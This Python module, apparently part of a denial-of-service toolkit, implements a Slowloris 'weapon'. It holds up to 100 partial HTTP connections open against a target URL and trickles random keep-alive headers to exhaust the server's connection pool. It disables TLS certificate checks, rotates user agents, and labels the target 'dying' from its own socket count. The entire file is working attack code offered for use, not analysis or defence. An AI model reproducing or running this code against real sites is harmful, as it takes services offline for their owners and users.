
"""
Slowloris weapon: holds many partial HTTP connections open to exhaust server connection pools.
"""

import random
import socket
import ssl
import time
import urllib
from typing import Any, Optional
import app.net
from app.models import AttackResult
from app.net import NetworkClient
from . import Weapon, WeaponFactory


class SlowLorisFactory(WeaponFactory):
    """
    Factory that produces `SlowLorisWeapon` instances.
    """

    def __init__(self, **kwargs: Any) -> None:
        WeaponFactory.__init__(self, **kwargs)

        self._num_sockets = kwargs['num_sockets'] if 'num_sockets' in kwargs else 100

    def make(self, network_client: Optional[Any] = None) -> 'SlowLorisWeapon':

        return SlowLorisWeapon(
            http_method=self._http_method,
            cache_buster=self._cache_buster,
            num_sockets=self._num_sockets,
            network_client=network_client
        )


class SlowLorisWeapon(Weapon):
    """
    Weapon that implements the Slowloris attack by maintaining `num_sockets` persistent half-open connections and periodically sending keep-alive headers. Bytes sent are best-effort estimates based on encoded header lengths; no response body is ever received.
    """

    def __init__(self, **kwargs: Any) -> None:
        Weapon.__init__(self, **kwargs)

        self._num_sockets = kwargs['num_sockets'] if 'num_sockets' in kwargs else 100

        # all of the sockets currently connected to the target
        self._sockets = []

        network_client = kwargs.get('network_client', None)
        if network_client is not None:
            self._network_client = network_client
        else:
            self._network_client = NetworkClient()
            self._network_client.rotate_user_agent()

    def _spawn_socket(self, target_url: str) -> tuple[socket.socket, int]:
        """
        Create a new socket connected to the given URL
        :param target_url: The URL of the site to connect to
        :return: Tuple of (socket, bytes_sent)
        """

        bytes_sent = 0

        # parse the URL / domain so we can connect to the directly to the domain
        (scheme, netloc, path, params, query, fragment) = urllib.parse.urlparse(target_url)
        if netloc == '':
            netloc, path = path, ''

        # set up socket

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(4)

        if scheme == 'https':
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            sock = context.wrap_socket(sock, server_hostname=netloc)

        # connect to remote server

        ip = socket.gethostbyname(netloc)

        port = 80
        if scheme == 'https':
            port = 443

        sock.connect((ip, port))

        # send connection HTTP headers

        http_line = ""
        if self._cache_buster:

            http_line = "%s /?%d HTTP/1.1\r\n" % (
                self._http_method, random.randint(0, 2000)
            )

        else:

            http_line = "%s / HTTP/1.1\r\n" % self._http_method

        http_line_bytes = http_line.encode("utf-8")
        sock.send(http_line_bytes)
        bytes_sent += len(http_line_bytes)

        header_str = "Host: %s\r\n" % netloc
        header_bytes = header_str.encode("utf-8")
        sock.send(header_bytes)
        bytes_sent += len(header_bytes)

        header_str = "User-Agent: %s\r\n" % self._network_client.get_user_agent()
        header_bytes = header_str.encode("utf-8")
        sock.send(header_bytes)
        bytes_sent += len(header_bytes)

        header_str = "Accept-language: en-US,en,q=0.5\r\n"
        header_bytes = header_str.encode("utf-8")
        sock.send(header_bytes)
        bytes_sent += len(header_bytes)

        return (sock, bytes_sent)

    def attack(self) -> AttackResult:
        result = AttackResult()
        hits = 0  # total # hits to the server we did
        total_bytes_sent = 0
        error_count = 0

        # send keep-alive headers to each of the sockets
        for sock in self._sockets:

            try:

                keep_alive_header = "X-a: %d\r\n" % random.randint(1, 5000)
                header_bytes = keep_alive_header.encode("utf-8")

                sock.send(header_bytes)
                total_bytes_sent += len(header_bytes)
                hits += 1

            except socket.error:

                self._sockets.remove(sock)
                if self._monitor:
                    self._monitor.decrement_active_sockets()
                error_count += 1

        # spawn sockets up to our maximum number
        for i in range(len(self._sockets), self._num_sockets):

            try:

                sock, spawn_bytes = self._spawn_socket(self._target_url)
                self._sockets.append(sock)
                total_bytes_sent += spawn_bytes
                if self._monitor:
                    self._monitor.increment_active_sockets()

            except socket.error as ex:
                # if there is an error, just skip it
                error_count += 1
                break

        # wait a few seconds before we send headers again
        time.sleep(13)

        # return a fake HTTP header based on whether our sockets are dying or not
        # 200 = OK, site is alive, 429 = too many connections, site is dying
        status_code = 200 if len(self._sockets) >= self._num_sockets else 429

        result.num_hits = hits
        result.http_status = status_code
        result.bytes_sent = total_bytes_sent
        result.bytes_received = 0
        result.response_time_ms = None
        result.errors = error_count

        return result

    def hold_fire(self) -> None:
        """
        Stop attacking and close all open sockets.
        Decrements the active socket count in the monitor.
        """
        # close all open sockets
        for sock in self._sockets:
            try:
                sock.close()
            except socket.error:
                pass

        # update monitor socket count
        if self._monitor and self._sockets:
            self._monitor.decrement_active_sockets(len(self._sockets))

        # clear the sockets list
        self._sockets = []
